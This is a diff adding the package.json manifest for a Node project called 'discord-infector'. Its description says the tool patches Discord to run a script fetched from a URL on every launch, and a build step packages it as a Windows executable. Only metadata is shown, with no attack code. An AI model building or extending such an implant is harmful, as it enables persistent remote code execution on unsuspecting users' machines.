@@ -1,0 +1,26 @@
+{
+  "name": "discord-infector",
+  "version": "1.0.0",
+  "description": "Patch Discord to run a script pointed to by a given url every time it launches.",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "build": "pkg index.js -t node12-win-x64 -o DiscordInfector.exe"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/7urb01/discord-infector.git"
+  },
+  "keywords": [
+    "discord"
+  ],
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/7urb01/discord-infector/issues"
+  },
+  "homepage": "https://github.com/7urb01/discord-infector#readme",
+  "dependencies": {
+    "request": "^2.88.0",
+    "request-promise": "^4.2.5"
+  }
+}
